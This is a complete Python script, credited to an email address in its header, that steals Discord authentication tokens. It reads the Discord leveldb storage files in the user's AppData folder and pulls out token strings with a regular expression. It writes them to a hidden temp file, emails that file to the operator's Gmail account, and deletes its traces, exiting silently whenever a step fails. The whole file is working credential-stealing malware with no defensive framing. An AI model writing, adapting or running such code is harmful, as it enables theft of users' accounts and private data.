# - AhmedViruso@Hotmail.Com

Us = "Your Gmail Address"
Pw = "Your Gmail Password"
    
#====================================================================================================================================================================================

try:
    import os,smtplib,re,glob,string,random
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    from datetime import datetime
except:
    exit()
    
#====================================================================================================================================================================================

try:
    AppData = os.getenv("AppData")
    Path = AppData+r"/Discord/Local Storage/leveldb"
except:
    exit()

#====================================================================================================================================================================================

try:
    Temp = os.getenv("Temp")
    Chars = string.ascii_uppercase + string.digits
    Random = "".join(random.sample(Chars*12, 12))+".temporary"
    Need = Temp+"/"+Random
except:
    exit()

#====================================================================================================================================================================================

try:
    os.chdir(Path)
    A = glob.glob("*")
    for i in A:
        try:
            # You Can Add [if(len(x) < 20): continue] for get tokens only , or add X[-1] For Get Last Token
            F = open(Path+"/"+"".join(i), 'rb')
            Text = F.read()
            Text = str(Text).replace("-","Microsoft1")
            Text = str(Text).replace(".","Update1")
            X = re.findall(r'"N\w+', Text)
            X = str(X).replace("Microsoft1","-")
            X = str(X).replace("Update1",".")
            H = open(Need, 'a')
            H.write(X)
            H.close()
        except:
            pass
except:
    if(os.path.exists(Need) == True):
        os.remove(Need)
    exit()

#====================================================================================================================================================================================

try:
    fromaddr = Us
    toaddr = Us
    msg = MIMEMultipart()
    now = datetime.now()
    now = now.strftime("%d/%m/%Y %H:%M:%S")
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Discord Token - [" + os.getlogin() + "] - " + str(now)
    filename = "Discord.txt"
    attachment = open(Need, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= {} " .format(filename) )
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(fromaddr, Pw)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    attachment.close()
    os.remove(Need)
except:
    if(os.path.exists(Need) == True):
        attachment.close()
        os.remove(Need)
    exit()
    
#====================================================================================================================================================================================
